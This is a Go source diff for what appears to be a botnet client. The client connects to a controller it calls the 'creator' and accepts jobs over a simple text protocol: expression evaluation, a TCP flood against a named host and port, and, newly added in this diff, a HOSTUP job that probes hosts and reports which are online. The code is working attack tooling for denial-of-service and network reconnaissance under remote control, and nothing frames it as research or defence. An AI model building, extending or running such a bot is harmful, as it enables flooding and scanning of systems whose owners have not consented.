@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"fmt"
 	"net"
 	"os"
@@ -33,21 +34,25 @@ func main() {
 	for {
 		fmt.Println("waiting for creator...")
 		result, err := bufio.NewReader(conn).ReadString('\n')
-		fmt.Println("received:", result)
 		if err != nil {
-			continue
+			break
 		}
 		cleanedResult := strings.TrimSpace(string(result))
+		fmt.Println("received:", cleanedResult, "state:", state)
 
 		if state == 1 && cleanedResult == "HELLOACK" {
 			state = 2
 		} else if state == 2 && cleanedResult == "JOB EQN" {
 			conn.Write([]byte("ACPT JOB EQN\r\n"))
-			fmt.Println("received:", result)
+			fmt.Println("accept:", result)
 			state = 3
 		} else if state == 2 && cleanedResult == "JOB TCPFLOOD" {
 			conn.Write([]byte("ACPT JOB TCPFLOOD\r\n"))
-			fmt.Println("received:", result)
+			fmt.Println("accept:", result)
+			state = 3
+		} else if state == 2 && cleanedResult == "JOB HOSTUP" {
+			conn.Write([]byte("ACPT JOB HOSTUP\r\n"))
+			fmt.Println("accept:", result)
 			state = 3
 		} else if state == 3 && cleanedResult[:7] == "JOB EQN" {
 			fmt.Println("[", cleanedResult[8:], "]")
@@ -55,13 +60,11 @@ func main() {
 			if err != nil {
 				fmt.Println("job failed... bad input?", err.Error())
 				conn.Write([]byte("JOB FAIL\r\n"))
-				break
 			}
 			expResult, err := expression.Evaluate(nil)
 			if err != nil {
 				fmt.Println("job failed... bad input?", err.Error())
 				conn.Write([]byte("JOB FAIL\r\n"))
-				break
 			} else {
 				conn.Write([]byte("JOB SUCC " + fmt.Sprint(expResult) + "\r\n"))
 			}
@@ -75,6 +78,30 @@ func main() {
 			jobs.TCPFlood(splits[0], port)
 
 			conn.Write([]byte("JOB SUCC \r\n"))
+			state = 4
+		} else if state == 3 && cleanedResult[:10] == "JOB HOSTUP" {
+			hosts := strings.Split(cleanedResult[11:], " ")
+			fmt.Println(hosts)
+			var buf bytes.Buffer
+			for _, host := range hosts {
+				online, offline, err := jobs.HostUp(host, &buf)
+				if err != nil {
+					if err.Error() != "timeout" {
+						conn.Write([]byte("JOB FAIL"))
+						break
+					}
+				}
+				conn.Write([]byte("JOB SUCC ONLINE "))
+				for _, ip := range online {
+					conn.Write([]byte(fmt.Sprint(ip, ", ")))
+				}
+				conn.Write([]byte("OFFLINE "))
+				for _, ip := range offline {
+					conn.Write([]byte(fmt.Sprint(ip, ", ")))
+				}
+				conn.Write([]byte("\r\n"))
+				break
+			}
 			state = 4
 		}
 		if state == 4 {
